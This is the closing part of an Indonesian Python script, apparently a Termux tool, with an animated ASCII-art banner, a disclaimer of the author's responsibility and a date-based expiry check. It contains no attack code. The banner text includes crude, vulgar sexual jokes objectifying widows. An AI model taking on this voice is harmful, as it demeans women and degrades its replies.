	Ella_Boy("_____________¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_____________");time.sleep(0.04)
	Ella_Boy("____________¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶____________");time.sleep(0.04)
	Ella_Boy("___________¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶____________");time.sleep(0.04)
	Ella_Boy("___________¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶___________");time.sleep(0.04)
	Ella_Boy("__________¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶___________");time.sleep(0.04)
	Ella_Boy("__________¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶___________");time.sleep(0.04)
	Ella_Boy("__________¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶___________");time.sleep(0.04)
	Ella_Boy("_________¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶__________");time.sleep(0.04)
	Ella_Boy("_________¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶__________");time.sleep(0.04)
	Ella_Boy("_________¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶__________");time.sleep(0.04)
	Ella_Boy("_________¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶__________");time.sleep(0.04)
	Ella_Boy("_________¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶__________");time.sleep(0.04)
	Ella_Boy("_________¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_________");time.sleep(0.04)
	Ella_Boy("_________¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_________");time.sleep(0.04)
	Ella_Boy("_________¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_________");time.sleep(0.04)
	Ella_Boy("_________¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_________");time.sleep(0.04)
	Ella_Boy("_________¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶\033[0;91m___\033[0m¶¶¶¶¶¶¶¶_________");time.sleep(0.04)
	Ella_Boy("_________¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶\033[0;91m_____\033[0m¶¶¶¶¶¶¶_________");time.sleep(0.04)
	Ella_Boy("__________¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶\033[0;91m_____\033[0m¶¶¶¶¶¶¶_________");time.sleep(0.04)
	Ella_Boy("__________¶¶¶¶\033[0;91m___\033[0m¶¶¶¶¶¶¶¶¶¶¶¶\033[0;91m_____\033[0m¶¶¶¶¶¶¶_________");time.sleep(0.04)
	Ella_Boy("__________¶¶¶\033[0;91m_____\033[0m¶¶¶¶¶¶¶¶¶¶¶\033[0;91m_____\033[0m¶¶¶¶¶¶__________");time.sleep(0.04)
	Ella_Boy("___________¶¶\033[0;91m_____\033[0m¶¶¶¶¶¶¶¶¶¶¶\033[0;91m_____\033[0m¶¶¶¶¶¶__________");time.sleep(0.04)
	Ella_Boy("___________¶¶\033[0;91m_____\033[0m¶¶¶¶\033[0;91m_\033[0m¶¶¶¶¶¶¶\033[0;91m___\033[0m¶¶¶¶¶¶___________");time.sleep(0.04)
	Ella_Boy("___________¶¶¶\033[0;91m____\033[0m¶¶¶¶\033[0;91m__\033[0m¶¶¶¶¶¶¶¶¶¶¶¶¶¶____________");time.sleep(0.04)
	Ella_Boy("____________¶¶¶\033[0;91m___\033[0m¶¶¶¶\033[0;91m__\033[0m¶¶¶¶¶¶¶¶¶¶¶¶¶_____________");time.sleep(0.04)
	Ella_Boy("____________¶¶¶¶\033[0;91m_\033[0m¶¶¶¶¶\033[0;91m__\033[0m¶¶¶¶¶¶¶¶¶¶¶¶______\033[0;91m¶\033[0m_______");time.sleep(0.04)
	Ella_Boy("________\033[0;91m¶\033[0m____¶¶¶¶¶¶¶¶¶¶\033[0;91m_\033[0m¶¶¶¶¶¶¶¶¶¶¶_______\033[0;91m¶¶¶¶\033[0m____");time.sleep(0.04)
	Ella_Boy("_____\033[0;91m¶¶¶¶\033[0m_____¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_________\033[0;91m¶¶¶¶\033[0m____");time.sleep(0.04)
	Ella_Boy("____\033[0;91m¶¶¶¶¶\033[0m_______¶¶¶¶¶¶¶¶¶¶¶¶¶¶____________\033[0;91m¶¶¶¶\033[0m____");time.sleep(0.04)
	Ella_Boy("____¶¶¶¶¶________¶¶¶¶¶¶¶¶__¶_¶____________¶¶¶¶____");time.sleep(0.04)
	Ella_Boy("_____¶¶¶¶________¶¶¶¶¶¶¶¶__¶_¶____________¶¶¶¶____");time.sleep(0.04)
	Ella_Boy("_____¶¶¶¶________¶¶¶¶¶¶_¶____¶¶__________¶¶¶¶_____");time.sleep(0.04)
	Ella_Boy("_____¶¶¶¶________¶¶¶¶_¶____¶_¶¶__________¶¶¶¶_____");time.sleep(0.04)
	Ella_Boy("_____¶¶¶¶________¶¶_¶____¶_¶¶¶¶¶_________¶¶¶¶_____");time.sleep(0.04)
	Ella_Boy("______¶¶¶_____________¶¶¶¶¶¶¶¶¶¶_________¶¶¶¶_____");time.sleep(0.04)
	Ella_Boy("______¶¶¶¶_______¶¶_¶¶¶¶¶¶¶¶¶¶¶¶¶_______¶¶¶¶¶¶¶¶¶_");time.sleep(0.04)
	Ella_Boy("___¶¶¶¶¶¶¶¶¶_____¶¶_¶¶¶¶¶¶¶¶¶¶¶¶¶______¶¶¶¶¶¶¶¶¶¶¶");time.sleep(0.04)
	Ella_Boy("_¶¶¶¶¶¶¶¶¶¶¶¶____¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶____¶¶¶¶¶¶¶¶¶¶¶¶");time.sleep(0.04)
	Ella_Boy("_¶¶¶¶¶¶¶¶¶¶¶¶¶¶__¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶__¶¶¶¶¶¶__\033[0;91m¶¶¶¶¶\033[0m_");time.sleep(0.04)
	Ella_Boy("__\033[0;91m¶¶¶¶¶\033[0m__¶¶¶¶¶¶¶__¶¶¶¶¶¶¶¶¶¶¶______¶¶¶¶¶¶____\033[0;91m¶¶¶¶\033[0m_");time.sleep(0.04)
	Ella_Boy("___\033[0;91m¶¶¶\033[0m_____¶¶¶¶¶¶_________________¶¶¶¶¶_______\033[0;91m¶¶¶\033[0m_");time.sleep(0.04)
	Ella_Boy("___\033[0;91m¶¶\033[0m_______¶¶¶¶¶¶¶_____________¶¶¶¶¶¶____________");time.sleep(0.04)
	Ella_Boy("______________¶¶¶¶¶¶¶__________¶¶¶¶¶¶_____________");time.sleep(0.04)
	Ella_Boy("_______________¶¶¶¶¶¶¶________¶¶¶¶¶_______________");time.sleep(0.04)
	Ella_Boy("_________________¶¶¶¶¶¶¶____¶¶¶¶¶¶________________");time.sleep(0.04)
	Ella_Boy("__________________¶¶¶¶¶¶¶__¶¶¶¶¶¶_________________");time.sleep(0.04)
	Ella_Boy("____________________¶¶¶¶¶¶¶¶¶¶¶___________________");time.sleep(0.04)
	Ella_Boy("______________________¶¶¶¶¶¶¶¶________\033[0;91m¶¶\033[0m__________");time.sleep(0.04)
	Ella_Boy("_______________________¶¶¶¶¶¶¶_______\033[0;91m¶¶¶¶\033[0m_________");time.sleep(0.04)
	Ella_Boy("_____________\033[0;91m¶¶\033[0m______¶¶¶¶¶¶¶¶¶¶¶____\033[0;91m¶¶¶¶¶\033[0m_________");time.sleep(0.04)
	Ella_Boy("_____________\033[0;91m¶¶¶¶\033[0m___¶¶¶¶¶__¶¶¶¶¶¶__\033[0;91m¶¶¶¶¶\033[0m__________");time.sleep(0.04)
	Ella_Boy("____________\033[0;91m¶¶¶¶¶\033[0m__¶¶¶¶¶_____¶¶¶¶¶¶¶¶¶¶___________");time.sleep(0.04)
	Ella_Boy("_____________¶¶¶¶¶¶¶¶¶_________¶¶¶¶¶¶_____________");time.sleep(0.04)
	Ella_Boy("________________¶¶¶¶¶____________¶¶¶______________");time.sleep(0.04)
	Ella_Boy("_________________¶¶¶______________¶¶¶_____________");time.sleep(0.04)
	Ella_Boy("_________________¶¶_______________¶¶¶_____________");time.sleep(0.04)
	Ella_Boy("________________\033[0;91m¶¶¶\033[0m_______________\033[0;91m¶¶¶¶\033[0m____________");time.sleep(0.04)
	Ella_Boy("________________\033[0;91m¶¶¶\033[0m_______________\033[0;91m¶¶¶¶\033[0m____________");time.sleep(0.04)
	Ella_Boy("_______________\033[0;91m¶¶¶¶\033[0m_______________\033[0;91m¶¶¶¶\033[0m____________");time.sleep(0.04)
	Ella_Boy("_______________\033[0;91m¶¶¶¶\033[0m_______________________________");time.sleep(0.04)
	jalan ("Apapun Yang Terjadi Admin/Author Tidak Bertanggung")
	jalan ("           Jawab Atas Yang Telah Terjadi.")
	Ella_Boy("")
	jalan ("           THANKS YOU MY Teacher BOY")
	Ella_Boy("")
	jalan ("            Salam Dari Saya Tumbal Termux")
	jalan ("                  PECINTA JANDA :)")
	Ella_Boy("")
	jalan ("            KENAPA SAYA MENYUKAI JANDA.?")
	jalan ("              KARNA JANDA ITU ENAK ∆_∆ ")
	jalan ("APA LAGI KALAU DAPET JANDA YANG BISA DI AJAK NGENTOT")
	jalan ("            DDDUUHHHH GAK KEBAYANG DAHH")
	Ella_Boy("")
	jalan ("     KALAU GAK PERCAYA COBAIN AJA PASTI ENAK")
	time.sleep(2)
	cekk()

def kadal():
	print("\nScript Akan Kadaluarsa Di TTL : 19/MARET/2022")
expired = ['19', '03', '2022']
saat_ini = datetime.now()
tgl = saat_ini.strftime('%d')
bln = saat_ini.strftime('%m')
thn = saat_ini.strftime('%Y')
waktu_new = (tgl+"-"+bln+"-"+thn)

if __name__=="__main__":
	tanggal = thn + bln + tgl
	exp = expired[2] + expired[1] + expired[0]
	if tanggal >= exp:
		os.system("clear")
		banner()
		print('\nScript Kadaluarsa Silahkan Tunggu Update Terbarunya')
		sys.exit()
	else:
		cekk()
